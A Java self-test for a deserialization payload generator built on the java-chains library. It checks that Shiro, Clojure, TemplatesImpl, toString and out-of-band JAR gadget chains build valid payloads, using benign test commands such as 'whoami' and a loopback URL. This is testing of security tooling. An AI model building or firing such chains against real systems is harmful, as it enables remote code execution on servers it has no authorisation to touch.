import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.TreeSet;

import org.vulhub.javachains.common.GadgetParam;
import payload.ChainScope;
import payload.JarPreset;
import payload.PayloadCatalog;
import payload.PayloadEngine;
import payload.PayloadResult;
import payload.RawPayload;
import payload.ToStringPreset;

/**
 * 载荷生成引擎自检：把「通用链引擎可用且安全」变成可机械判定的断言。
 *
 * <p>覆盖七类：载体与节点目录、分组表一致性、节点导航、逐个载体创建、
 * 失败路径、双形态往返、安全约束。每条断言都走引擎自己的判据
 * （{@code validateChainTags}），不另写一套链规则，否则只能证明自检与实现一致。
 *
 * <p>用法（缺 --add-opens 时字节码类节点会构建失败）：
 * java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
 *      --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED
 *      -cp "target\classes;lib\java-chains-cli-2.0.0-beta4.jar" PayloadCheck
 */
public final class PayloadCheck {

    /** 实测载体数；与运行时不一致说明依赖换了版本，分组表需要重新核对。 */
    private static final int RECORDED_PAYLOAD_COUNT = 28;
    /** 实测节点数下限。 */
    private static final int RECORDED_MIN_NODE_COUNT = 400;
    /** 安全断言的连续字符长度：摘要里出现这么长的正文片段就视为泄露。 */
    private static final int LEAK_RUN = 16;

    private static int passed;
    private static int failed;

    public static void main(String[] args) throws Exception {
        // 逐载体创建会真实执行 Exec / Clojure 节点里的命令（上游默认值是 calc）：
        // 自检退出时把弹出的计算器进程收掉
        TestProcessGuard.install("PayloadCheck");
        PayloadEngine.init();
        System.out.println("引擎状态: " + PayloadEngine.statusMessage());
        check("引擎初始化完成", PayloadEngine.isReady());

        List<String> payloads = PayloadEngine.payloadIds();
        List<String> nodes = PayloadEngine.nodeIds();
        System.out.println("实测目录: 节点 " + nodes.size() + " 个，载体 " + payloads.size() + " 个");

        catalog(payloads, nodes);
        groups(payloads);
        navigation();
        createAll(payloads);
        failures();
        dualForm();
        labels();
        safety(payloads);
        endToEnd();
        oobJarPresets();
        tostringPresets(nodes);

        System.out.println();
        System.out.println("断言总数 " + (passed + failed) + "，失败 " + failed);
        if (failed > 0) System.exit(1);
        System.out.println("载荷生成引擎自检通过");
        System.exit(0);
    }

    /** 目录断言：数量与实测记录一致，且标识去重。 */
    private static void catalog(List<String> payloads, List<String> nodes) {
        check("载体数恰为 " + RECORDED_PAYLOAD_COUNT, payloads.size() == RECORDED_PAYLOAD_COUNT);
        check("载体标识去重", new HashSet<String>(payloads).size() == payloads.size());
        check("节点数不少于 " + RECORDED_MIN_NODE_COUNT, nodes.size() >= RECORDED_MIN_NODE_COUNT);
        check("节点标识去重", new HashSet<String>(nodes).size() == nodes.size());
        check("节点目录含载体目录", nodes.containsAll(payloads));
        check("分组表登记数与运行时一致", PayloadCatalog.cataloguedCount() == payloads.size());
        check("目录与运行时零偏差：" + PayloadEngine.groupIssues(), PayloadEngine.groupIssues().isEmpty());
    }

    /** 分组断言：每个载体恰好属于一个分组，分组并集等于载体目录。 */
    private static void groups(List<String> payloads) {
        Set<String> union = new TreeSet<String>();
        boolean duplicated = false;
        for (String group : PayloadCatalog.groups()) {
            for (String member : PayloadCatalog.membersOf(group)) {
                if (!union.add(member)) duplicated = true;
            }
        }
        check("分组内无重复登记", !duplicated);
        check("分组并集等于载体目录", union.equals(new TreeSet<String>(payloads)));

        Set<String> declared = new HashSet<String>(PayloadCatalog.groups());
        List<String> unknown = new ArrayList<String>();
        for (String payloadId : payloads) {
            // 反查必须落到一个已声明的分组：落到表外说明分组表漏登记了这个载体
            if (!declared.contains(PayloadCatalog.groupOf(payloadId))) unknown.add(payloadId);
        }
        check("每个载体都能反查到一个已声明的分组：" + unknown, unknown.isEmpty());
        check("未知分组返回空列表", PayloadCatalog.membersOf("nosuchgroup").isEmpty());
        check("未知载体归入其他分组", "其他".equals(PayloadCatalog.groupOf("nosuchpayload")));
        check("载体一定位到分组就稳定不变",
                PayloadCatalog.groupOf("fastjsonpayload").equals(PayloadCatalog.groupOf("fastjsonpayload")));
    }

    /** 导航断言：后继查询稳定，已知后继关系成立。 */
    private static void navigation() {
        List<String> next = PayloadEngine.nextNodes("templatesimpl");
        check("节点后继查询非空", !next.isEmpty());
        check("后继集合重复查询结果一致", next.equals(PayloadEngine.nextNodes("templatesimpl")));
        check("templatesimpl 的后继含 bytecodeconvert", next.contains("bytecodeconvert"));
        check("未知节点的后继为空", PayloadEngine.nextNodes("nosuchnode").isEmpty());
        check("未知节点无参数", PayloadEngine.paramsOf("nosuchnode").isEmpty());
        check("可查询节点参数", !PayloadEngine.paramsOf("exec").isEmpty());
        check("参数声明带引擎认识的完整键",
                hasParamKey(PayloadEngine.paramsOf("exec"), "Exec.cmd"));

        List<String> first = PayloadEngine.firstNodes("javanativepayload");
        check("载体有可选首节点：" + first.size() + " 个", !first.isEmpty());
        check("首节点重复查询结果一致", first.equals(PayloadEngine.firstNodes("javanativepayload")));
        check("首节点不含载体自身", !first.contains("javanativepayload"));
        List<String> invalid = new ArrayList<String>();
        for (String node : first) {
            if (!PayloadEngine.isChainValid(Arrays.asList("javanativepayload", node))) invalid.add(node);
        }
        check("首节点逐个都通过引擎链校验：" + invalid, invalid.isEmpty());
        check("未知载体没有可选首节点", PayloadEngine.firstNodes("nosuchpayload").isEmpty());
        check("单节点链不算合法链", !PayloadEngine.isChainValid(Arrays.asList("javanativepayload")));
    }

    /**
     * 节点显示名断言：列式选链要在列内展示可读名称，取不到时回退成标识。
     *
     * <p>要求的是「结论确定」：上游实测有 3 个节点没有登记显示名，
     * 这类节点必须返回空串让调用方回退，而不是返回标识——若直接返回标识，
     * 调用方就分不清「引擎真的登记了这个名字」与「引擎没有名字」。
     */
    private static void labels() {
        check("已知节点有显示名", !PayloadEngine.nodeLabel("templatesimpl").trim().isEmpty());
        check("显示名重复查询结果一致",
                PayloadEngine.nodeLabel("templatesimpl").equals(PayloadEngine.nodeLabel("templatesimpl")));
        check("未知节点的显示名为空", PayloadEngine.nodeLabel("nosuchnode").isEmpty());
        check("空标识与空引用的显示名为空",
                PayloadEngine.nodeLabel("").isEmpty() && PayloadEngine.nodeLabel("   ").isEmpty()
                        && PayloadEngine.nodeLabel(null).isEmpty());

        // 无副作用：显示名查询不得改变节点目录与参数声明
        List<String> nodesBefore = PayloadEngine.nodeIds();
        List<String> paramsBefore = new ArrayList<String>();
        for (GadgetParam param : PayloadEngine.paramsOf("exec")) paramsBefore.add(param.getKey());
        for (String node : PayloadEngine.nodeIds()) PayloadEngine.nodeLabel(node);
        check("显示名查询不改变节点目录", nodesBefore.equals(PayloadEngine.nodeIds()));
        List<String> paramsAfter = new ArrayList<String>();
        for (GadgetParam param : PayloadEngine.paramsOf("exec")) paramsAfter.add(param.getKey());
        check("显示名查询不改变参数声明", paramsBefore.equals(paramsAfter));

        // 载体名必须能取到：列式选链的第一列直接用显示名，取不到会显示成裸标识
        int missing = 0;
        for (String payloadId : PayloadEngine.payloadIds()) {
            if (PayloadEngine.nodeLabel(payloadId).trim().isEmpty()) missing++;
        }
        check("全部载体都有显示名（缺失数 " + missing + "）", missing == 0);
    }

    private static boolean hasParamKey(List<GadgetParam> params, String key) {
        for (GadgetParam param : params) {
            if (key.equals(param.getKey())) return true;
        }
        return false;
    }

    /**
     * 逐个载体创建断言。
     *
     * <p>要求的是「结论确定」而不是「全部成功」：需要回连地址一类必填参数的载体
     * 在没给参数时就该失败，但失败必须是带原因的失败，不能抛异常、不能返回 null、
     * 更不能把上一次的载荷带出来。
     */
    private static void createAll(List<String> payloads) {
        int success = 0;
        int refused = 0;
        List<String> problems = new ArrayList<String>();
        for (String payloadId : payloads) {
            List<String> first = PayloadEngine.firstNodes(payloadId);
            if (first.isEmpty()) {
                problems.add(payloadId + " 没有可选首节点");
                continue;
            }
            PayloadResult result;
            try {
                result = PayloadEngine.build(payloadId, Arrays.asList(first.get(0)),
                        new LinkedHashMap<String, Object>());
            } catch (Throwable error) {
                problems.add(payloadId + " 抛出 " + error.getClass().getSimpleName());
                continue;
            }
            if (result == null) {
                problems.add(payloadId + " 返回 null");
            } else if (result.success) {
                success++;
            } else if (result.message.trim().isEmpty()) {
                problems.add(payloadId + " 失败但没说原因");
            } else if (!result.base64.isEmpty() || result.byteLength() != 0 || !result.digest.isEmpty()) {
                problems.add(payloadId + " 失败却带出了载荷");
            } else {
                refused++;
            }
        }
        System.out.println("  逐个载体创建：成功 " + success + " 个，带原因的拒绝 " + refused + " 个");
        check("全部 " + payloads.size() + " 个载体都给出确定结论：" + problems, problems.isEmpty());
        check("至少有一个载体能直接构建出载荷", success > 0);
        check("需要必填参数的载体被拒绝而不是硬凑", refused > 0);
    }

    /** 失败路径断言：目录外载体、空链、非法后继都必须给原因且不产出载荷。 */
    private static void failures() {
        PayloadResult unknown = PayloadEngine.build("nosuchpayload", Arrays.asList("exec"),
                new LinkedHashMap<String, Object>());
        check("目录外的载体被拒绝", !unknown.success);
        check("目录外载体的失败带出原因", !unknown.message.trim().isEmpty());
        check("目录外载体的失败不带载荷",
                unknown.base64.isEmpty() && unknown.byteLength() == 0 && unknown.digest.isEmpty());

        PayloadResult empty = PayloadEngine.build("javanativepayload", new ArrayList<String>(),
                new LinkedHashMap<String, Object>());
        check("空链被拒绝", !empty.success);
        check("空链的失败原因可读：" + empty.message, empty.message.contains("至少"));

        check("未选载体被拒绝", !PayloadEngine.build("", Arrays.asList("exec"),
                new LinkedHashMap<String, Object>()).success);
        check("空载体标识被拒绝", !PayloadEngine.build("   ", Arrays.asList("exec"),
                new LinkedHashMap<String, Object>()).success);

        PayloadResult badChain = PayloadEngine.build("javanativepayload", Arrays.asList("nosuchgadget"),
                new LinkedHashMap<String, Object>());
        check("不被认可的后继节点被拒绝", !badChain.success);
        check("不被认可的后继节点失败时给出链序", badChain.message.contains("nosuchgadget"));
        check("非法链失败时同样不产出载荷",
                badChain.base64.isEmpty() && badChain.byteLength() == 0);

        PayloadResult wrongOrder = PayloadEngine.build("javanativepayload",
                Arrays.asList("bytecodeconvert", "clojure"), new LinkedHashMap<String, Object>());
        check("顺序不对的链不会被误当成成功：" + wrongOrder.message, !wrongOrder.success);
    }

    /** 双形态断言：Base64 文本与原始字节必须指向同一份载荷。 */
    private static void dualForm() {
        PayloadResult result = PayloadEngine.build("javanativepayload", Arrays.asList("clojure"),
                command("Clojure.cmd", "whoami"));
        check("基准链构建成功：" + result.message, result.success);
        check("成功结果的原始字节非空", result.byteLength() > 0);
        byte[] decoded;
        try {
            decoded = Base64.getDecoder().decode(result.base64);
        } catch (IllegalArgumentException error) {
            check("Base64 文本可标准解码", false);
            return;
        }
        check("Base64 文本可标准解码", true);
        check("解码长度与原始字节长度一致", decoded.length == result.byteLength());
        check("首尾各 4 字节逐字节一致", sameHeadAndTail(decoded, result.bytes));
        check("摘要记录载体与长度",
                result.digest.contains("javanativepayload")
                        && result.digest.contains(String.valueOf(result.byteLength())));
        check("摘要记录完整链序", result.digest.contains("clojure"));
    }

    private static boolean sameHeadAndTail(byte[] left, byte[] right) {
        if (left.length < 8 || right.length < 8) return false;
        for (int index = 0; index < 4; index++) {
            if (left[index] != right[index]) return false;
            if (left[left.length - 1 - index] != right[right.length - 1 - index]) return false;
        }
        return true;
    }

    /** 安全断言：不替使用者填回连地址、摘要不含正文、生成过程不落盘。 */
    private static void safety(List<String> payloads) {
        check("空参数归一化结果为空", PayloadEngine.normalizeParams(null).isEmpty());

        Map<String, String> given = new LinkedHashMap<String, String>();
        given.put("Clojure.cmd", "whoami");
        given.put("", "丢弃");
        given.put("   ", "也丢弃");
        Map<String, Object> normalized = PayloadEngine.normalizeParams(given);
        check("参数归一化保留显式传入的键值",
                normalized.size() == 1 && "whoami".equals(normalized.get("Clojure.cmd")));
        check("参数归一化丢弃空白键", !normalized.containsKey("") && !normalized.containsKey("   "));

        PayloadResult result = PayloadEngine.build("javanativepayload", Arrays.asList("clojure"),
                normalized);
        check("摘要不含载荷正文任意连续 " + LEAK_RUN + " 个字符",
                !containsRun(result.digest, result.base64, LEAK_RUN));
        check("摘要不含原始字节的解码文本",
                !containsRun(result.digest,
                        new String(result.bytes, java.nio.charset.StandardCharsets.ISO_8859_1), LEAK_RUN));

        Map<String, String> before = declaredParamValues();
        PayloadEngine.build("javanativepayload", Arrays.asList("clojure"), normalized);
        check("构建不写回上游参数声明", before.equals(declaredParamValues()));

        // 只给命令参数构建：本工具不得替使用者把 JNDI / SSRF 一类参数补成回连地址。
        // 上游自带的示例值（回环、dnslog 占位域名）原样保留，不代表本工具会去填。
        PayloadResult onlyCommand = PayloadEngine.build("javanativepayload", Arrays.asList("clojure"),
                command("Clojure.cmd", "whoami"));
        check("只给命令参数也能构建成功", onlyCommand.success);
        check("构建结果里没有本工具补出来的连接地址",
                !onlyCommand.digest.toLowerCase(Locale.ROOT).contains("http")
                        && !onlyCommand.digest.contains("ldap"));

        List<String> beforeFiles = workspaceFiles();
        for (String payloadId : payloads) {
            List<String> first = PayloadEngine.firstNodes(payloadId);
            if (first.isEmpty()) continue;
            PayloadEngine.build(payloadId, Arrays.asList(first.get(0)), new LinkedHashMap<String, Object>());
        }
        check("连续构建全部载体后工作区无新增文件", beforeFiles.equals(workspaceFiles()));
    }

    private static Map<String, Object> command(String key, String value) {
        Map<String, Object> params = new LinkedHashMap<String, Object>();
        params.put(key, value);
        return params;
    }

    /** 上游参数声明的当前取值快照：键 -> 值。 */
    private static Map<String, String> declaredParamValues() {
        Map<String, String> values = new LinkedHashMap<String, String>();
        for (String node : PayloadEngine.nodeIds()) {
            for (GadgetParam param : PayloadEngine.paramsOf(node)) {
                String key = param.getKey() == null ? "" : param.getKey();
                values.put(key, param.getValue() == null ? "" : String.valueOf(param.getValue()));
            }
        }
        return values;
    }

    private static boolean containsRun(String haystack, String needle, int runLength) {
        if (haystack == null || needle == null || needle.length() < runLength) return false;
        for (int start = 0; start + runLength <= needle.length(); start++) {
            if (haystack.contains(needle.substring(start, start + runLength))) return true;
        }
        return false;
    }

    /** 工作区文件快照：生成载荷不应在磁盘上留下任何文件。 */
    private static List<String> workspaceFiles() {
        List<String> names = new ArrayList<String>();
        collect(new File("."), names, 0);
        Collections.sort(names);
        return names;
    }

    private static void collect(File directory, List<String> names, int depth) {
        File[] children = directory.listFiles();
        if (children == null || depth > 2) return;
        for (File child : children) {
            String name = child.getName();
            if (".git".equals(name) || "target".equals(name) || ".backups".equals(name)
                    || "__pycache__".equals(name)) {
                continue;
            }
            names.add(child.getPath() + (child.isDirectory() ? "/" : ""));
            if (child.isDirectory()) collect(child, names, depth + 1);
        }
    }

    /**
     * HTTP 带外 Jar 模板断言。
     *
     * <p>要求的是「每条模板都真能出合法 Jar」而不是「列表非空」：模板本身只是节点 id
     * 与参数键的组合，写错一个键在界面上看不出来，只有真构建一次才能发现。
     */
    private static void oobJarPresets() {
        List<JarPreset.Kind> kinds = JarPreset.kinds();
        List<JarPreset.Action> actions = JarPreset.actions();
        System.out.println("  带外 Jar：类型 " + kinds.size() + " 种，末端动作 " + actions.size() + " 种");
        check("带外 Jar 提供多种包装类型", kinds.size() >= 5);
        check("带外 Jar 提供多种末端动作", actions.size() >= 5);
        check("带外 Jar 载体为 otherpayload", "otherpayload".equals(JarPreset.carrier()));
        check("带外 Jar 链序含载体与字节码转换",
                JarPreset.chainText("jar", "exec").equals("otherpayload -> jar -> bytecodeconvert -> exec"));
        check("未知 Jar 类型被拒绝而不是硬凑", JarPreset.kindOf("nosuchkind") == null);
        check("未知末端动作被拒绝", JarPreset.actionOf("nosuchaction") == null);
        check("动作声明了自己需要哪些输入",
                JarPreset.actionOf("exec").usesCommand() && !JarPreset.actionOf("exec").usesUrl());
        check("URL 类动作声明了 URL 参数键",
                JarPreset.actionOf("httpreq").usesUrl() && JarPreset.actionOf("httpreq").urlParam.contains("."));
        check("空值参数不下发（避免覆盖引擎默认值）",
                JarPreset.params("jar", "httpreq", "", "", "", "", "", false).isEmpty());
        check("Zip 魔数判别对空数组为假", !JarPreset.looksLikeJar(new byte[0]));

        int built = 0;
        int failed = 0;
        int notJar = 0;
        for (JarPreset.Kind kind : kinds) {
            for (JarPreset.Action action : actions) {
                Map<String, Object> params = JarPreset.params(kind.nodeId, action.nodeId,
                        "http://127.0.0.1:1/x", "whoami", "", "com.example.User", "", true);
                RawPayload result = PayloadEngine.buildRaw(JarPreset.carrier(),
                        JarPreset.gadgets(kind.nodeId, action.nodeId), params);
                if (!result.success) {
                    failed++;
                    continue;
                }
                built++;
                if (!JarPreset.looksLikeJar(result.bytes)) notJar++;
            }
        }
        int total = kinds.size() * actions.size();
        System.out.println("  带外 Jar 实测：" + total + " 种组合，成功 " + built
                + "，失败 " + failed + "，非 Zip " + notJar);
        check("全部 Jar 类型 × 末端动作组合都能构建：" + failed + " 个失败", failed == 0);
        check("构建成功的产物全部是合法 Zip（PK 魔数）", built == total && notJar == 0);
    }

    /**
     * toString 触发链模板断言。
     *
     * <p>既校验模板自身的完备性，也校验 {@link ChainScope} 的清单与运行时目录一致：
     * 清单是与「把触发节点从通用页收走」同一份判据，它漂移了就会一边多列一边少列。
     */
    private static void tostringPresets(List<String> runtimeNodes) {
        List<ToStringPreset.Template> templates = ToStringPreset.templates();
        System.out.println("  toString 链模板 " + templates.size() + " 条");
        check("toString 链提供多条模板", templates.size() >= 5);
        check("toString 链载体为 javanativepayload",
                "javanativepayload".equals(ToStringPreset.carrier()));
        check("默认模板存在", ToStringPreset.byId(ToStringPreset.defaultId()) != null);
        check("未知模板被拒绝", ToStringPreset.byId("nosuchtemplate") == null);
        check("未知模板给出可读提示", !ToStringPreset.issue("nosuchtemplate").isEmpty());
        check("已知模板不报问题", ToStringPreset.issue(ToStringPreset.defaultId()).isEmpty());
        check("自定义目标类会写进参数",
                ToStringPreset.params(ToStringPreset.defaultId(), "", "com.example.User")
                        .containsKey("BytecodeConvert.className"));
        check("留空目标类不写该参数",
                !ToStringPreset.params(ToStringPreset.defaultId(), "", "").containsKey("BytecodeConvert.className"));
        check("命令有默认值", ToStringPreset.params(ToStringPreset.defaultId(), "", "")
                .containsKey(ToStringPreset.commandParam()));

        int valid = 0;
        int built = 0;
        for (ToStringPreset.Template template : templates) {
            // 触发节点必须是链的第一个 gadget：早期版本把它漏在模板之外，
            // 五条模板全部报「链不被引擎认可」，界面看起来正常、一点生成就失败
            List<String> full = new ArrayList<String>();
            full.add(ToStringPreset.carrier());
            full.addAll(template.gadgets);
            boolean ok = PayloadEngine.isChainValid(full);
            if (ok) valid++;
            PayloadResult result = PayloadEngine.build(ToStringPreset.carrier(), template.gadgets,
                    ToStringPreset.params(template.id, "whoami", "com.example.User"));
            if (result.success) built++;
            System.out.println("    " + template.id + " valid=" + ok + " build=" + result.success
                    + " len=" + result.byteLength());
        }
        check("全部 toString 模板都被引擎认可（" + valid + "/" + templates.size() + "）",
                valid == templates.size());
        check("全部 toString 模板都能构建出载荷（" + built + "/" + templates.size() + "）",
                built == templates.size());

        check("toString 清单登记了触发节点", ChainScope.toStringNodes().size() >= 20);
        check("toString 触发节点是链的首个节点",
                ChainScope.isToStringNode(ToStringPreset.byId(ToStringPreset.defaultId()).gadgets.get(0)));
        check("toString 清单与运行时目录一致：" + ChainScope.issues(runtimeNodes),
                ChainScope.issues(runtimeNodes).isEmpty());
        check("运行时全部 toString 节点都被清单覆盖",
                ChainScope.availableToStringNodes(runtimeNodes).size() == ChainScope.toStringNodes().size());
        // 载体名字里带 tostring，但它不是触发节点：按名字后缀猜一定会误伤
        check("toString 载体不被当成触发节点", !ChainScope.isToStringNode("hessian2tostringpayload"));
        check("不以 ToString 结尾的触发节点也被识别", ChainScope.isToStringNode("gstringcomparetotostring"));
        check("过滤后通用页候选不再含 toString 触发节点",
                !ChainScope.genericCandidates(runtimeNodes).contains("caseinsensitivemap3tostring"));
        check("过滤只剔除 toString 节点，其余候选项原样保留",
                ChainScope.genericCandidates(runtimeNodes).size()
                        == runtimeNodes.size() - ChainScope.availableToStringNodes(runtimeNodes).size());
        check("过滤不改动传入清单", runtimeNodes.contains("caseinsensitivemap3tostring"));
    }

    /** 端到端断言：一条真实可用的多节点链必须能构建出载荷。 */
    private static void endToEnd() {
        List<String> chain = Arrays.asList("clojure", "templatesimpl", "bytecodeconvert", "tomcatecho");
        PayloadResult result = PayloadEngine.build("shiropayload", chain,
                command("Clojure.cmd", "whoami"));
        System.out.println("  端到端链 shiropayload -> " + String.join(" -> ", chain)
                + " : " + result.message + "，长度 " + result.byteLength() + " 字节");
        check("四节点 Shiro 链构建成功", result.success);
        check("四节点链载荷长度大于 0", result.byteLength() > 0);
        check("四节点链的摘要不含正文", !containsRun(result.digest, result.base64, LEAK_RUN));
        check("四节点链的摘要记录全部节点",
                result.digest.contains("templatesimpl") && result.digest.contains("tomcatecho"));
    }

    private static void check(String message, boolean condition) {
        if (condition) {
            passed++;
            System.out.println("  [PASS] " + message);
        } else {
            failed++;
            System.out.println("  [FAIL] " + message);
        }
    }
}
